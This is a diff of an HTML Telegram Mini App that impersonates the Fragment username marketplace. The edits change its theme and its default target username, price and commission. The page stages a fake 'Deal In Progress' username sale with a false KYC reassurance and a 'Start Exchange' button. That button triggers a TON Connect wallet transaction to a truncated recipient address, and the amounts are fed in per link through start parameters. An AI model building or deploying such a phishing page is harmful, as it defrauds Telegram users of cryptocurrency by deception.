@@ -7,37 +7,31 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-dark: #0f0f0f;           /* Основной фон Fragment */
-            --bg-card: #1a1a1a;            /* Фон карточек */
-            --text-primary: #ffffff;       /* Основной текст */
-            --text-secondary: #a0a0a0;     /* Вторичный текст */
-            --border: #2a2a2a;             /* Границы */
-            --primary: #bb6bd9;            /* Основной фиолетовый */
-            --primary-light: #d9a0ed;      /* Светлый фиолетовый */
-            --accent: #2f80ed;             /* Акцентный синий */
-            --success: #27ae60;            /* Цвет успеха */
-            --warning: #f2c94c;            /* Цвет предупреждения */
-            --error: #eb5757;              /* Цвет ошибки */
+            --primary: #0088cc;           /* Основной голубой цвет Fragment */
+            --primary-light: #4da6ff;     /* Светлый голубой */
+            --bg-light: #f8f9fa;          /* Светлый фон */
+            --text-primary: #212529;      /* Основной текст */
+            --text-secondary: #6c757d;    /* Вторичный текст */
+            --border: #e0e0e0;            /* Границы */
+            --success: #28a745;           /* Цвет успеха */
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         
         body {
-            font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-dark);
+            background-color: #ffffff;
             color: var(--text-primary);
             line-height: 1.6;
             font-size: 15px;
             padding: 0;
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
         }
         
         .container {
@@ -48,154 +42,85 @@
         
         /* Шапка Fragment */
         .fragment-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 15px 0;
+            text-align: center;
+            padding: 15px 0 25px;
             border-bottom: 1px solid var(--border);
-            margin-bottom: 25px;
         }
         
         .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: -0.5px;
+            margin-bottom: 5px;
         }
         
-        .logo-icon {
-            width: 28px;
-            height: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
-            border-radius: 8px;
-            font-weight: 700;
+        .subheader {
             font-size: 16px;
-        }
-        
-        .logo-text {
-            font-size: 22px;
-            font-weight: 700;
-            background: linear-gradient(to right, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .header-actions {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .header-action {
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 10px;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             color: var(--text-secondary);
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .header-action:hover {
-            background: rgba(255, 255, 255, 0.15);
-            color: var(--text-primary);
         }
         
         /* Основной контент */
-        .section-title {
-            font-size: 16px;
-            font-weight: 500;
-            color: var(--text-secondary);
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .section-title i {
-            color: var(--primary);
-        }
-        
-        .card {
-            background-color: var(--bg-card);
-            border-radius: 16px;
-            padding: 25px;
-            margin-bottom: 20px;
-            border: 1px solid var(--border);
+        .section {
+            padding: 25px 0;
+            border-bottom: 1px solid var(--border);
         }
         
         .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(187, 107, 217, 0.15);
+            display: inline-block;
+            background-color: #e6f7ff;
             color: var(--primary);
             font-size: 14px;
             font-weight: 500;
-            padding: 6px 14px;
-            border-radius: 20px;
+            padding: 5px 12px;
+            border-radius: 12px;
             margin-bottom: 15px;
         }
         
         .username-title {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 700;
-            margin: 5px 0 25px;
+            margin: 10px 0 25px;
             color: var(--text-primary);
-            letter-spacing: -0.5px;
         }
         
-        .pricing-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 30px;
+        .pricing-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 25px;
         }
         
-        .price-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 18px;
-            border: 1px solid var(--border);
-        }
-        
-        .price-label {
-            font-size: 14px;
+        .pricing-table th {
+            text-align: left;
+            font-weight: 500;
             color: var(--text-secondary);
-            margin-bottom: 8px;
+            padding-bottom: 8px;
+            font-size: 15px;
         }
         
-        .price-value {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 3px;
-            color: var(--text-primary);
+        .pricing-table td {
+            padding: 6px 0;
+            font-weight: 600;
+            font-size: 18px;
         }
         
-        .price-subvalue {
-            font-size: 14px;
+        .dollar-value {
+            font-weight: 400;
+            font-size: 15px;
             color: var(--text-secondary);
         }
         
         /* Информационные блоки */
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 16px;
-            margin-bottom: 25px;
+        .info-section {
+            margin: 25px 0;
         }
         
         .info-item {
-            display: flex;
-            flex-direction: column;
+            margin-bottom: 18px;
         }
         
         .info-label {
-            font-size: 14px;
+            font-size: 15px;
             color: var(--text-secondary);
             margin-bottom: 5px;
             font-weight: 500;
@@ -205,55 +130,40 @@
             font-size: 17px;
             font-weight: 500;
             color: var(--text-primary);
-            word-break: break-all;
         }
         
         .info-value.address {
-            font-family: 'IBM Plex Mono', monospace;
-            font-size: 15px;
-            color: var(--primary-light);
+            font-family: monospace;
+            font-size: 16px;
+            color: var(--primary);
         }
         
         /* Кнопка */
         .action-btn {
-            background: linear-gradient(135deg, var(--primary), var(--accent));
+            background-color: var(--primary);
             color: white;
             border: none;
-            border-radius: 14px;
-            padding: 18px;
+            border-radius: 10px;
+            padding: 16px;
             width: 100%;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            margin: 25px 0 15px;
-            transition: all 0.2s ease;
-            font-family: 'IBM Plex Sans', sans-serif;
-            letter-spacing: 0.5px;
+            margin: 30px 0 15px;
+            transition: background-color 0.2s;
         }
         
         .action-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(187, 107, 217, 0.4);
-        }
-        
-        .action-btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn-text {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            background-color: #0073b1;
         }
         
         /* Примечание */
-        .note-card {
-            background: rgba(47, 128, 237, 0.1);
-            border-radius: 14px;
+        .note-section {
+            background-color: #f1f8ff;
+            border-radius: 10px;
             padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid var(--accent);
+            margin: 25px 0;
+            border-left: 3px solid var(--primary);
         }
         
         .note-content {
@@ -268,27 +178,24 @@
         }
         
         /* Торговая информация */
-        .trade-section {
+        .trade-table {
+            width: 100%;
+            border-collapse: collapse;
             margin-top: 25px;
         }
         
-        .trade-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 2fr;
-            gap: 15px;
+        .trade-table th {
+            text-align: left;
+            font-weight: 500;
+            color: var(--text-secondary);
+            padding-bottom: 10px;
             font-size: 15px;
         }
         
-        .trade-header {
-            color: var(--text-secondary);
+        .trade-table td {
+            padding: 8px 0;
             font-weight: 500;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-        
-        .trade-value {
-            font-weight: 500;
-            color: var(--text-primary);
+            font-size: 16px;
         }
         
         .status-ready {
@@ -297,19 +204,18 @@
         }
         
         .address-value {
-            font-family: 'IBM Plex Mono', monospace;
+            font-family: monospace;
             font-size: 14px;
-            color: var(--primary-light);
-            word-break: break-all;
+            color: var(--primary);
         }
         
         /* Лоадер */
         .loader {
-            border: 4px solid rgba(255, 255, 255, 0.1);
+            border: 4px solid rgba(0, 0, 0, 0.1);
             border-top: 4px solid var(--primary);
             border-radius: 50%;
-            width: 36px;
-            height: 36px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
             margin: 25px auto;
             display: none;
@@ -325,33 +231,6 @@
             font-size: 14px;
             color: var(--text-secondary);
             margin-top: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        /* Адаптивность */
-        @media (max-width: 500px) {
-            .container {
-                padding: 15px;
-            }
-            
-            .card {
-                padding: 20px;
-            }
-            
-            .username-title {
-                font-size: 22px;
-            }
-            
-            .pricing-grid {
-                gap: 15px;
-            }
-            
-            .price-card {
-                padding: 15px;
-            }
         }
     </style>
 </head>
@@ -359,71 +238,57 @@
     <div class="container">
         <!-- Шапка Fragment -->
         <div class="fragment-header">
-            <div class="logo">
-                <div class="logo-icon">F</div>
-                <div class="logo-text">FRAGMENT</div>
-            </div>
-            <div class="header-actions">
-                <div class="header-action">
-                    <i class="fas fa-bell"></i>
-                </div>
-                <div class="header-action">
-                    <i class="fas fa-cog"></i>
-                </div>
-            </div>
+            <div class="logo">FRAGMENT</div>
+            <div class="subheader">Search usernames</div>
         </div>
         
-        <!-- Карточка с информацией о сделке -->
-        <div class="card">
-            <div class="section-title">
-                <i class="fas fa-search"></i>
-                <span>Search usernames</span>
-            </div>
-            
+        <!-- Секция с информацией о сделке -->
+        <div class="section">
             <div class="badge">
-                <i class="fas fa-sync-alt fa-spin"></i> Deal In Progress
+                <i class="fas fa-sync-alt"></i> Deal In Progress
             </div>
             
-            <div class="username-title" id="usernameDisplay">cammiliss.t.me</div>
+            <div class="username-title" id="usernameDisplay">biruk.t.me</div>
             
-            <div class="pricing-grid">
-                <div class="price-card">
-                    <div class="price-label">Deal Price</div>
-                    <div class="price-value" id="priceDisplay">180 TON</div>
-                    <div class="price-subvalue" id="priceDollar">~ $522.06</div>
-                </div>
-                <div class="price-card">
-                    <div class="price-label">Commission</div>
-                    <div class="price-value" id="commissionDisplay">90 TON</div>
-                    <div class="price-subvalue" id="commissionDollar">~ $261.03</div>
-                </div>
-            </div>
+            <table class="pricing-table">
+                <tr>
+                    <th>Deal Price</th>
+                    <th>Commission</th>
+                </tr>
+                <tr>
+                    <td>
+                        <div id="priceDisplay">100 TON</div>
+                        <div class="dollar-value" id="priceDollar">~ $522.00</div>
+                    </td>
+                    <td>
+                        <div id="commissionDisplay">5 TON</div>
+                        <div class="dollar-value" id="commissionDollar">~ $26.10</div>
+                    </td>
+                </tr>
+            </table>
             
-            <div class="info-grid">
+            <div class="info-section">
                 <div class="info-item">
                     <div class="info-label">How does this work?</div>
                 </div>
                 <div class="info-item">
                     <div class="info-label">Telegram Username</div>
-                    <div class="info-value" id="usernameText">@cammiliss</div>
+                    <div class="info-value" id="usernameText">@biruk</div>
                 </div>
                 <div class="info-item">
                     <div class="info-label">Web Address</div>
-                    <div class="info-value">t.me/<span id="usernameLink">cammiliss</span></div>
+                    <div class="info-value">t.me/<span id="usernameLink">biruk</span></div>
                 </div>
                 <div class="info-item">
                     <div class="info-label">TON Web 3.0 Address</div>
-                    <div class="info-value address" id="tonAddress">cammiliss.t.me</div>
+                    <div class="info-value address" id="tonAddress">biruk.t.me</div>
                 </div>
             </div>
         </div>
         
         <!-- Кнопка действия -->
         <button class="action-btn" id="startExchange">
-            <div class="btn-text">
-                <i class="fas fa-exchange-alt"></i>
-                <span>Start Exchange</span>
-            </div>
+            Start Exchange
         </button>
         
         <div class="loader" id="loader"></div>
@@ -433,49 +298,48 @@
         </div>
         
         <!-- Примечание о KYC -->
-        <div class="note-card">
+        <div class="note-section">
             <div class="note-content">
                 You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of <span class="note-highlight">25,000 TON</span>.
             </div>
         </div>
         
         <!-- Торговая информация -->
-        <div class="trade-section">
-            <div class="section-title">
-                <i class="fas fa-chart-line"></i>
-                <span>Trade Info</span>
-            </div>
-            
-            <div class="trade-grid">
-                <div>
-                    <div class="trade-header">Deal Status</div>
-                    <div class="trade-value status-ready">Ready</div>
-                </div>
-                <div>
-                    <div class="trade-header">TON - Username</div>
-                    <div class="trade-value">Swappable</div>
-                </div>
-                <div>
-                    <div class="trade-header">Recipient</div>
-                    <div class="trade-value address-value" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</div>
-                </div>
-            </div>
-        </div>
+        <table class="trade-table">
+            <tr>
+                <th>Deal Status</th>
+                <th>TON - Username</th>
+                <th>Recipient</th>
+            </tr>
+            <tr>
+                <td class="status-ready">Ready</td>
+                <td>Swappable</td>
+                <td class="address-value" id="recipientAddress">Ef_BbsF16B4aReCFhXIO...</td>
+            </tr>
+        </table>
     </div>
 
     <script>
         // Инициализация Telegram WebApp
         const Telegram = window.Telegram.WebApp;
-        const tonConnect = new TonConnectSDK.TonConnect();
+        let tonConnect;
         
-        // Установка темы Fragment
-        Telegram.setHeaderColor('#0f0f0f');
-        Telegram.setBackgroundColor('#0f0f0f');
+        try {
+            tonConnect = new TonConnectSDK.TonConnect();
+        } catch (e) {
+            console.error("TON Connect initialization error:", e);
+        }
+        
+        // Установка светлой темы
+        Telegram.setHeaderColor('#ffffff');
+        Telegram.setBackgroundColor('#ffffff');
         
         // Показываем загрузчик
         function showLoader(show) {
-            document.getElementById('loader').style.display = show ? 'block' : 'none';
-            document.getElementById('startExchange').disabled = show;
+            const loader = document.getElementById('loader');
+            const startBtn = document.getElementById('startExchange');
+            if (loader) loader.style.display = show ? 'block' : 'none';
+            if (startBtn) startBtn.disabled = show;
         }
         
         // Парсинг параметров запуска
@@ -484,9 +348,9 @@
                 if (Telegram.initDataUnsafe && Telegram.initDataUnsafe.start_param) {
                     const params = Telegram.initDataUnsafe.start_param.split('-');
                     return {
-                        username: params[0] || 'cammiliss',
-                        price: params[1] || '180',
-                        commission: params[2] || '90'
+                        username: params[0] || 'biruk',
+                        price: params[1] || '100',
+                        commission: params[2] || '5'
                     };
                 }
             } catch (e) {
@@ -494,9 +358,9 @@
             }
             
             return {
-                username: 'cammiliss',
-                price: '180',
-                commission: '90'
+                username: 'biruk',
+                price: '100',
+                commission: '5'
             };
         }
         
@@ -512,9 +376,9 @@
             document.getElementById('commissionDisplay').textContent = `${commission} TON`;
             document.getElementById('tonAddress').textContent = `${username}.t.me`;
             
-            // Рассчитываем стоимость в долларах (курс 1 TON = $2.90)
-            const priceDollar = (parseFloat(price) * 2.90).toFixed(2);
-            const commissionDollar = (parseFloat(commission) * 2.90).toFixed(2);
+            // Рассчитываем стоимость в долларах (курс 1 TON = $5.22)
+            const priceDollar = (parseFloat(price) * 5.22).toFixed(2);
+            const commissionDollar = (parseFloat(commission) * 5.22).toFixed(2);
             document.getElementById('priceDollar').textContent = `~ $${priceDollar}`;
             document.getElementById('commissionDollar').textContent = `~ $${commissionDollar}`;
             
@@ -530,7 +394,7 @@
             
             try {
                 // Проверяем доступность TON Connect
-                if (typeof TonConnectSDK === 'undefined') {
+                if (!tonConnect) {
                     Telegram.showAlert("TON Connect is not available. Please update Telegram.");
                     return;
                 }
@@ -564,7 +428,7 @@
                     if (result && result.boc) {
                         // Успешная транзакция
                         const btn = document.getElementById('startExchange');
-                        btn.innerHTML = '<i class="fas fa-check"></i> Transaction Completed!';
+                        btn.textContent = '✓ Transaction Completed';
                         btn.style.background = 'var(--success)';
                         btn.disabled = true;
                         
@@ -594,12 +458,6 @@
         Telegram.expand();
         Telegram.BackButton.hide();
         updateUI();
-        
-        // Для режима отладки вне Telegram
-        if (!window.Telegram) {
-            document.body.style.backgroundColor = '#0f0f0f';
-            document.body.style.padding = '20px';
-        }
     </script>
 </body>
 </html>
